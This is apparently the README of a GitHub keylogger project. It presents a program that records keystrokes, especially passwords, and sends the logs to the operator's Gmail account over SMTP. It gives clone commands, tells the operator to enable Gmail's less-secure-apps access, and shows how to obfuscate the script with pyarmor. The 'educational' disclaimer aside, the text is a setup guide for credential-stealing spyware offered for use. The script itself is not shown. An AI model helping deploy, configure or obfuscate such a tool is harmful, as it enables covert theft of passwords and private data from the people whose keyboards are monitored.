# Keylogger


A keylogger is a computer program that records all keys used by a computer user, especially passwords and other confidential information. **I am not responsible for any illegal act done using this script. Use it with your own responsibility. The article is educational in nature. Its illegal use is punishable by law.**



## Privacy
As for usage and privacy, you must enter your personal information specifically the email username and password where you will be sent the logs and this information must be true in order for the script to be authenticated on the official Gmail server `smtp.gmail.com:587` Before proceeding, please visit the following link: `https://myaccount.google.com/lesssecureapps` and enable access from less secure apps, otherwise the script will simply not work

## Download
```bash
$ git clone https://github.com/Kuduxaaa/keylogger
$ cd keylogger
$ # Edit files
```

### Obfuscate code
If you want to obfuscate files so that no one else can see your passwords:
```bash
$ sudo pip3 install pyarmor
$ pyarmor o keylogger_smtp.py
```


## Links

![Keystroke Logging - Wikipedia](https://en.wikipedia.org/wiki/Keystroke_logging)

![What is keylogger](https://www.csoonline.com/article/3326304/what-is-a-keylogger-how-attackers-can-monitor-everything-you-type.html)

![Cybercrime](https://en.wikipedia.org/wiki/Cybercrime)
